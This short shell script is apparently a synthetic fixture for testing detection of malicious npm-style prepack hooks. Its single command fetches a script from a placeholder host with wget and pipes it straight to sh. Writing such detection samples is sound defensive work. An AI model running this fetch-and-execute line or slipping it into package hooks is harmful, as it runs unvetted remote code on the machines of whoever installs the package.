#!/bin/sh
# FIXTURE ONLY — synthetic detection test sample, not real malware
# Inert sample: prepack runs when a git dependency is packed.
set -e
wget -qO- https://stage.example.invalid/pack-helper.sh | sh
